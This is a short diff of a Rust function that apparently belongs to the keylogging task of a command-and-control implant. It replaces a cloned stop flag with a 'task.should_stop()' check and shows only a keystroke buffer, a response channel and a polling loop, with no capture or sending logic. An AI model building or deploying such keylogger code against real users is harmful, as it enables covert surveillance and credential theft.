@@ -105,7 +105,6 @@ pub async fn execute(task: Task) {
 
     let keystrokes = Arc::new(Mutex::new(String::new()));
     let keystrokes_clone = keystrokes.clone();
-    let stop = task.job.stop.clone();
     let send_responses = task.job.send_responses.clone();
     let task_id = task.data.task_id.clone();
     let user = get_user();
@@ -174,7 +173,7 @@ pub async fn execute(task: Task) {
     loop {
         tokio::time::sleep(std::time::Duration::from_secs(5)).await;
 
-        if stop.load(std::sync::atomic::Ordering::Relaxed) {
+        if task.should_stop() {
             stop_ref.store(true, std::sync::atomic::Ordering::Relaxed);
             break;
         }
